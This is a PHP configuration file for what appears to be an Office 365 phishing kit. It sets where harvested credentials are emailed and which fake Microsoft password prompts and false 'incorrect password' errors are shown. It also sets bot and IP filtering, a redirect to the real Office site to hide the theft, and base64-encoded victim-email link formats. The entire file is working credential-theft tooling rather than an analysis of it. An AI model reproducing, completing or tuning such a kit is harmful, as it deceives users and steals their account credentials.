<?php

require 'email.php';
@session_start();error_reporting(0);
$toEmail = $to; //use "odunayoresultbox18@gmail.com" for receive result in multiple emails
$fromemail = "bot@example.com";//
$fromname = "Logs";
$subjectTitle = "Logs";
$officeLink = "https://www.office.com/";
$FailRedirect = "https://www.wikipedia.org/wiki/Microsoft_Office";
$AutoGrab = true;//if auto grab set to false you can open direct without put email in link like:domain.com/off365
$outputpass = "W3LL";// password for link of results (domain.com/dir/output.php)
$Resetlogs = true; //clears all logs
$ResetAllow = true; //reset list of blocked ips and emails and regions (allow all except bot)
$onlylistemails = false; //allow only a list of emails (put emails in EMAILS.txt. Each email in line)
$onlyonetimeuse = false; //true will make page become died after the user put all passwords 
$limitedarea = false;//"^196.*.*.*,^41.*.*.*,160.*.*.*";//for limited ip or country-- put here your allowed ips and ip ranges//exemple:"^38.100.200.*,39.100.1.1"
$base64encodeData = true;//true OR false(using base64encoded email value in link or not)
$randfirstpart = 'authorize_client_id:'; //Change this word to edit the first part within link
$passloopNumber = 2; //1 to 5
$firstmsg= 1; // false/1/2/3/4
//$firstmsg= false: (disabled)
//$firstmsg= 1: (Because you're accessing sensitive info, you need to verify your password)
//$firstmsg= 2: (Enter password to access your office Mail)
//$firstmsg= 3: (Because you're accessing sensitive info, you need to verify your password to access your Voicemail)
//$firstmsg= 4: (Verify your password to access your Microsoft OneDrive)
$error = "Sign in attempt timeout, verify your password";
$error2 =  $error3  =  $error4 = $error5 = "Your password is incorrect. If you don't remember your password";
$successMsgTitle = 'Success';
$successMsg = 'Successfully confirmed;<br/>Redirecting to home page ...';
$successMsgTimeout = '1000';
$visitorfileName = "data.txt";//Name of file to save all visitors IP logs; may contain also bot IP logs. replace it with "false" to stop it.
$logsfileName = "logs.txt";//Name of file to save real visitors IP logs; replace it with "false" to stop it
$PageLink = "Page Name";//This name will shown in logs info. Put "false" (to disable it), "true" (to use url as name) or put custom name like:("my first page")

$TitlesArray=array("verify your account","Verify your identity","verify your credentials","verify your informations","verify your email","verify your login","confirm your account","confirm your identity","confirm your credentials","confirm your information","confirm your email","confirm your login","login to your account","signin to your account","connect your account");
$fixIndex = false; //false or true --- activate it only if you get error related with index.php redirecting
###Link Examples:###
### Base64 Encoded Email###
#### domain.com/off365/?email=base64(email)   #####
#### domain.com/off365/?target=base64(email)  #####
#### domain.com/off365/?data=base64(email)    #####
### Non Encoded Email###
#### domain.com/off365/?email=email           #####
#### domain.com/off365/?target=email          #####
#### domain.com/off365/?data=email            #####
?>